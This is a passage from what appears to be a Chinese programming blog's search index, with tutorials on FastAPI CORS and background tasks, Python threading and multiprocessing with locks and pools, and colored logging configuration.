<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLz9udW09MjI=">http://127.0.0.1:8000/?num=22</span></li>
<li><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDAwLz9udW09c3Ry">http://127.0.0.1:8000/?num=str</span></li>
</ul>
<p>执行顺序是从下往上先执行<code>call_next</code>前的代码,然后执行<code>call_next</code>后, 再从上往下执行<code>call_next</code>后的部分, 可以看成栈的操作顺序, 先入后出, 后入先出.</p>
<h3 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h3><blockquote>
<p>指浏览器中运行的前端拥有与后端通信的 JavaScript 代码，而后端处于与前端不同的「源」的情况.</p>
</blockquote>
<p>源是协议（<code>http</code>，<code>https</code>）、域（<code>myapp.com</code>，<code>localhost</code>，<code>localhost.tiangolo.com</code>）以及端口（<code>80</code>、<code>443</code>、<code>8080</code>）的组合。</p>
<p>因此，这些都是不同的源：</p>
<ul>
<li><code>http://localhost</code></li>
<li><code>https://localhost</code></li>
<li><code>http://localhost:8080</code></li>
</ul>
<p>即使它们都在 <code>localhost</code> 中，但是它们使用不同的协议或者端口，所以它们都是不同的「源」</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="comment"># 导入 CORSMiddleware</span></span><br><span class="line"><span class="keyword">from</span> fastapi.middleware.cors <span class="keyword">import</span> CORSMiddleware</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个允许的源列表（由字符串组成）</span></span><br><span class="line">origins = [</span><br><span class="line">    <span class="string">&quot;http://localhost.tiangolo.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://localhost.tiangolo.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将其作为「中间件」添加到你的 FastAPI 应用中</span></span><br><span class="line">app.add_middleware(</span><br><span class="line">    CORSMiddleware,</span><br><span class="line">    allow_origins=origins,</span><br><span class="line">    allow_credentials=<span class="literal">True</span>,	<span class="comment"># 允许凭证（授权 headers，Cookies 等）</span></span><br><span class="line">    allow_methods=[<span class="string">&quot;*&quot;</span>],  <span class="comment"># 特定的 HTTP 方法（POST，PUT）或者使用通配符 &quot;*&quot; 允许所有方法</span></span><br><span class="line">    allow_headers=[<span class="string">&quot;*&quot;</span>],  <span class="comment"># 特定的 HTTP headers 或者使用通配符 &quot;*&quot; 允许所有 headers。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>其它应用 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC9hZHZhbmNlZC9taWRkbGV3YXJlLw==">🚪</span></p>
</blockquote>
<h2 id="创建后台任务"><a href="#创建后台任务" class="headerlink" title="创建后台任务"></a>创建后台任务</h2><blockquote>
<p>使用场景: 邮件发送, 图片渲染下载...</p>
</blockquote>
<p>使用<code>BackgroundTasks</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> BackgroundTasks, FastAPI</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_notification</span>(<span class="params">email: <span class="built_in">str</span>, message=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;log.txt&quot;</span>, mode=<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> email_file:</span><br><span class="line">        content = <span class="string">f&quot;notification for <span class="subst">&#123;email&#125;</span>: <span class="subst">&#123;message&#125;</span>&quot;</span></span><br><span class="line">        email_file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/send-notification/&#123;email&#125;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_notification</span>(<span class="params">email: <span class="built_in">str</span>, background_tasks: BackgroundTasks</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 先方法名后传参</span></span><br><span class="line">    background_tasks.add_task(write_notification, email, message=<span class="string">&quot;some notification&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Notification sent in the background&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h2><blockquote>
<p>以下部分属于比较少用到或者是知识量较多需要深入学习的, 故只提供官方链接以供参考</p>
</blockquote>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9leHRyYS1kYXRhLXR5cGVzLw==">使用其它数据类型</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9yZXF1ZXN0LWZpbGVzLw==">设置请求文件</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9oYW5kbGluZy1lcnJvcnMv">错误异常处理</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9ib2R5LXVwZGF0ZXMv">请求体更新数据</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9mYXN0YXBpLnRpYW5nb2xvLmNvbS96aC90dXRvcmlhbC9zcWwtZGF0YWJhc2VzLw==">使用关系数据库</span></li>
</ul>
]]></content>
      <categories>
        <category>学习教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>FastAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 线程进程相关库的简单应用</title>
    <url>/f89f9ea4/</url>
    <content><![CDATA[<h2 id="🎇简单了解"><a href="#🎇简单了解" class="headerlink" title="🎇简单了解"></a>🎇简单了解</h2><h3 id="线程和进程"><a href="#线程和进程" class="headerlink" title="线程和进程"></a>线程和进程</h3><ul>
<li>每个程序至少有一个进程，不同进程之间不共享内存</li>
<li>一个进程包含一个或多个线程，线程共享着同一个进程的内存</li>
<li>在操作系统保护模式下，一个进程崩溃不会对其他进程产生影响，而线程没有独立的内存空间，但它有自己的堆栈和局部变量</li>
<li>线程可以通过共享变量的方式实现多线程直接的通信，而进程的通信主要通过消息传递。相对共享变量而言，消息传递会消耗更多资源</li>
</ul>
<h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><ul>
<li>同步是指不同的程序单元为了完成某个任务通过某种通信方式协调一致，意味着有序</li>
<li>异步指不同程序单元之间不需要协调也可单独完成任务</li>
</ul>
<h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><blockquote>
<p>来自 Erlang之父 Joe Armstrong 的解释</p>
<p>并发：两个队列和一台咖啡机<br>并行：两个队列和两台咖啡机</p>
</blockquote>
<p><img data-src="http://img.owq.world/2021/11/2134-81fe70.png"></p>
<ul>
<li>并发表示<strong>多个程序可以在同一个时间段内被执行</strong></li>
<li>并行表示多个程序可以在<strong>同一时刻</strong>被运行</li>
</ul>
<hr>
<h2 id="Threading库"><a href="#Threading库" class="headerlink" title="Threading库"></a>Threading库</h2><blockquote>
<p>官方文档: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3RocmVhZGluZy5odG1s">https://docs.python.org/zh-cn/3/library/threading.html</span></p>
</blockquote>
<h3 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">n</span>): <span class="comment"># 需要被线程执行的函数</span></span><br><span class="line">    time.sleep(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 实例化线程</span></span><br><span class="line">    t = Thread(target=wait, args=[<span class="number">10</span>])</span><br><span class="line">    t.start()	<span class="comment"># 启动线程, 线程开始执行</span></span><br><span class="line">    t.join()	<span class="comment"># 会将主线程挂起，直到子线程运行结束</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="开发应用"><a href="#开发应用" class="headerlink" title="开发应用"></a>开发应用</h3><p>使用继承方式创建线程，可以做一些额外的逻辑处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, args, tname=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="comment"># 调用父类构造函数</span></span><br><span class="line">        Thread.__init__(self)</span><br><span class="line">        self.tname = tname</span><br><span class="line">        self.func = func</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="comment"># 线程执行的具体逻辑</span></span><br><span class="line">        self.func(*self.args)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">n</span>):</span><br><span class="line">    time.sleep(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 实例化线程</span></span><br><span class="line">    t = MyThread(wait, (<span class="number">10</span>,), wait.__name__)</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h3><blockquote>
<p>线程间通信强调的是线程之间传递对象引用</p>
</blockquote>
<p>Python中有GIL锁，是不是代表线程中的共享变量就一定是安全的？先看一个例子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">ZERO = <span class="number">0</span>	<span class="comment"># 共享变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># 多次操作</span></span><br><span class="line">        ZERO += <span class="number">1</span></span><br><span class="line">        ZERO -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line">    [t.join() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ZERO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>执行后会发现，每次<code>ZERO</code>的结果都不一样，这是每个线程拿到GIL并不会一直执行下去，整个程序是异步并发的，所以函数内对<code>ZERO</code>的操作并不是原子性。</p>
<p>解决方法：加互斥锁，将重要指令包装成原子操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread</span><br><span class="line"></span><br><span class="line">ZERO = <span class="number">0</span>	<span class="comment"># 共享变量</span></span><br><span class="line">LOCK = Lock()	<span class="comment"># 创建lock对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># 多次操作</span></span><br><span class="line">        LOCK.acquire() <span class="comment"># 获得lock对象，lock状态变为locked，并且阻塞其他线程获取lock对象</span></span><br><span class="line">        ZERO += <span class="number">1</span></span><br><span class="line">        ZERO -= <span class="number">1</span></span><br><span class="line">        LOCK.release() <span class="comment"># 释放lock对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo2</span>():</span><br><span class="line">    <span class="keyword">global</span> ZERO</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>):	<span class="comment"># 多次操作</span></span><br><span class="line">        <span class="keyword">with</span> LOCK:	<span class="comment"># 另一种使用方法：使用 with 简化操作</span></span><br><span class="line">            ZERO += <span class="number">1</span></span><br><span class="line">            ZERO -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line">    [t.join() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(ZERO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="Multiprocessing库"><a href="#Multiprocessing库" class="headerlink" title="Multiprocessing库"></a>Multiprocessing库</h2><blockquote>
<p>Python 中的多进程是通过 multiprocessing 包来实现的，和多线程的 threading.Thread 差不多，它可以利用 multiprocessing.Process 对象来创建一个进程对象，其使用方法与threading库很像。</p>
</blockquote>
<h3 id="简单应用-1"><a href="#简单应用-1" class="headerlink" title="简单应用"></a>简单应用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">n</span>):</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test process: <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    process_array = [Process(target=foo, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    [p.start() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line">    [p.join() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main process finish&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h3 id="开发应用-1"><a href="#开发应用-1" class="headerlink" title="开发应用"></a>开发应用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WorkerProcess</span>(<span class="title class_ inherited__">Process</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, func</span>):</span><br><span class="line">        Process.__init__(self)</span><br><span class="line">        self.name = name</span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; Run the thread &quot;&quot;&quot;</span></span><br><span class="line">        self.func(self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Started worker <span class="subst">&#123;name&#125;</span>&#x27;</span>)</span><br><span class="line">    worker_time = random.randint(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">    time.sleep(worker_time)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span> worker finished in <span class="subst">&#123;worker_time&#125;</span> seconds&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    process_array = [WorkerProcess(name=<span class="string">f&#x27;computer_<span class="subst">&#123;i&#125;</span>&#x27;</span>, func=worker) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    [p.start() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line">    [p.join() <span class="keyword">for</span> p <span class="keyword">in</span> process_array]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main process finish&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><blockquote>
<p>当需要启动大量的子进程，可以用进程池的方式批量创建子进程</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wait_task</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Run task <span class="subst">&#123;name&#125;</span>, <span class="subst">&#123;os.getpid()&#125;</span>&#x27;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    time.sleep(random.random() * <span class="number">3</span>)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Task <span class="subst">&#123;name&#125;</span> runs <span class="subst">&#123;end-start&#125;</span> seconds&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Parent process %s.&#x27;</span> % os.getpid())</span><br><span class="line">    p = Pool(<span class="number">9</span>)	<span class="comment"># 默认大小是CPU的核数</span></span><br><span class="line"></span><br><span class="line">    [p.apply_async(wait_task, args=(i,)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;All subprocesses done&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="进程锁"><a href="#进程锁" class="headerlink" title="进程锁"></a>进程锁</h3><blockquote>
<p>对于所有在<code>threading</code>存在的同步原语，<code>multiprocessing</code>中都有类似的等价物。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Lock, Process</span><br><span class="line"></span><br><span class="line">LOCK = Lock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">with</span> LOCK:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;os.getpid()&#125;</span> is running&#x27;</span>)</span><br><span class="line">        time.sleep(random.randint(<span class="number">1</span>,<span class="number">3</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;os.getpid()&#125;</span> is done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    [Process(target=foo, args=(i,)).start() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Threading</tag>
        <tag>Multiprocessing</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 使用 YAML 配置带有颜色输出的loging</title>
    <url>/dfbb4c9/</url>
    <content><![CDATA[<blockquote>
<p>官方教程文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9ob3d0by9sb2dnaW5nLmh0bWw=">🚪</span><br>官方配置文档 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L2xvZ2dpbmcuY29uZmlnLmh0bWw=">🚪</span><br>格式属性表 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtdHcvMy9saWJyYXJ5L2xvZ2dpbmcuaHRtbCNsb2dnaW5nLkxvZ1JlY29yZA==">🔎</span><br>如何写好日志 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU5NTE5">🔎</span></p>
</blockquote>
<h2 id="⭐常用名词"><a href="#⭐常用名词" class="headerlink" title="⭐常用名词"></a>⭐常用名词</h2><table>
<thead>
<tr>
<th>关键字</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Logger</td>
<td>日志记录程序</td>
</tr>
<tr>
<td>Handler</td>
<td>处理程序</td>
</tr>
<tr>
<td>Formatter</td>
<td>格式化程序</td>
</tr>
<tr>
<td>CRITICAL</td>
<td>危险</td>
</tr>
<tr>
<td>ERROR</td>
<td>错误</td>
</tr>
<tr>
<td>WARNING</td>
<td>警告</td>
</tr>
<tr>
<td>INFO</td>
<td>信息</td>
</tr>
<tr>
<td>DEBUG</td>
<td>调试</td>
</tr>
</tbody></table>
<h2 id="🌠先有个印象"><a href="#🌠先有个印象" class="headerlink" title="🌠先有个印象"></a>🌠先有个印象</h2><p>日志库采用模块化方法，并提供几类组件：记录器、处理器、过滤器和格式器。</p>
<ul>
<li>记录器暴露了应用程序代码直接使用的接口。</li>
<li>处理器将日志记录（由记录器创建）发送到适当的目标。</li>
<li>过滤器提供了更精细的附加功能，用于确定要输出的日志记录。(本文不涉及)</li>
<li>格式器指定最终输出中日志记录的样式。</li>
</ul>
<h2 id="🧿最小使用案例"><a href="#🧿最小使用案例" class="headerlink" title="🧿最小使用案例"></a>🧿最小使用案例</h2><p><strong>使用根记录器输出日志</strong><br>简单了解日志输出方式的两种方式和日志输出的等级</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认根记录只记录WARNING以上的日志, 所以使用debug和info是不会被输出的</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG) # 配置下日志等级就输出了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置日志文件路径, 会写到文件里</span></span><br><span class="line"><span class="comment"># logging.basicConfig(filename=&#x27;example.log&#x27;, level=logging.INFO)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 根日志记录器 输出(记录等级从高到低)</span></span><br><span class="line">logging.debug(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">logging.info(<span class="string">&#x27;INFO&#x27;</span>)</span><br><span class="line">logging.warning(<span class="string">&#x27;WARNING&#x27;</span>)</span><br><span class="line">logging.error(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">logging.critical(<span class="string">&#x27;CRITICAL&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>格式化日志输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># format 格式化输出形式</span></span><br><span class="line"><span class="comment"># 使用 datefmt 可以自定义时间输出格式</span></span><br><span class="line">logging.basicConfig(<span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s: %(message)s&#x27;</span>, datefmt=<span class="string">&#x27;%m/%d/%Y %I:%M:%S %p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">logging.warning(<span class="string">&#x27;再不签到就迟到了!&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="🌈带点颜色输出"><a href="#🌈带点颜色输出" class="headerlink" title="🌈带点颜色输出"></a>🌈带点颜色输出</h2><blockquote>
<p>基本使用, 了解3大组件记录器、处理器和格式器之间的关系</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> colorlog</span><br><span class="line"></span><br><span class="line"><span class="comment"># 颜色配置</span></span><br><span class="line"><span class="comment"># 可用: black red green yellow blue purple cyan white, 和 bold_**</span></span><br><span class="line">log_colors = &#123;</span><br><span class="line">    <span class="string">&#x27;DEBUG&#x27;</span>: <span class="string">&#x27;cyan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;INFO&#x27;</span>: <span class="string">&#x27;green&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;WARNING&#x27;</span>: <span class="string">&#x27;yellow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ERROR&#x27;</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CRITICAL&#x27;</span>: <span class="string">&#x27;bold_red&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建日志记录器</span></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;logger_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建控制台处理器, 会在控制台输出日志</span></span><br><span class="line">console_handler = logging.StreamHandler()</span><br><span class="line"><span class="comment"># 创建文件处理器, 会记录日志到test.log</span></span><br><span class="line">file_handler = logging.FileHandler(filename=<span class="string">&#x27;test.log&#x27;</span>, mode=<span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line">console_handler.setLevel(logging.DEBUG)</span><br><span class="line">file_handler.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用指定的格式字符串初始化格式化程序</span></span><br><span class="line">file_formatter = logging.Formatter(</span><br><span class="line">    fmt=<span class="string">&#x27;[%(asctime)s %(levelname)s] %(filename)s -&gt; %(funcName)s line:%(lineno)d: %(message)s&#x27;</span>,</span><br><span class="line">    datefmt=<span class="string">&#x27;%Y-%m-%d  %H:%M:%S&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># 使用 colorlog 的格式化程序</span></span><br><span class="line">console_formatter = colorlog.ColoredFormatter(</span><br><span class="line">    fmt=<span class="string">&#x27;%(log_color)s[%(asctime)s %(levelname)s] %(message)s&#x27;</span>,</span><br><span class="line">    datefmt=<span class="string">&#x27;%Y-%m-%d  %H:%M:%S&#x27;</span>,</span><br><span class="line">    log_colors=log_colors</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置格式化程序</span></span><br><span class="line">console_handler.setFormatter(console_formatter)</span><br><span class="line">file_handler.setFormatter(file_formatter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 